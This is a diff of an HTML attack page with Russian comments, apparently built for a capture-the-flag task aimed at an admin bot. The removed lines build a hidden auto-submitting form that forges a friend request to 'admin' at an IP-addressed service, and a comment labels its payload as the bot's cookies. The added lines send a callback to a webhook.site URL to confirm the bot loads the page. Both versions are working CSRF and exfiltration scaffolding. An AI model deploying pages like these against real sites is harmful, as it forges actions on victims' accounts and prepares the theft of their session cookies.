@@ -2,27 +2,9 @@
 <html>
 <body>
     <script>
-        // Создаём форму с cookies
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form. action = 'http://158.160.184.159:13002/api/friendship/request';
-        
-        const inputUser = document.createElement('input');
-        inputUser.type = 'hidden';
-        inputUser.name = 'to_user';
-        inputUser.value = 'admin';
-        
-        const inputMessage = document.createElement('input');
-        inputMessage.type = 'hidden';
-        inputMessage.name = 'message';
-        inputMessage.value = 123;  // Все cookies бота
-        
-        form.appendChild(inputUser);
-        form.appendChild(inputMessage);
-        document.body.appendChild(form);
-        
-        // Отправляем форму
-        form.submit();
+        // Просто отправляем 123 на webhook
+        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?data=123');
     </script>
+    <p>Sending... </p>
 </body>
 </html>
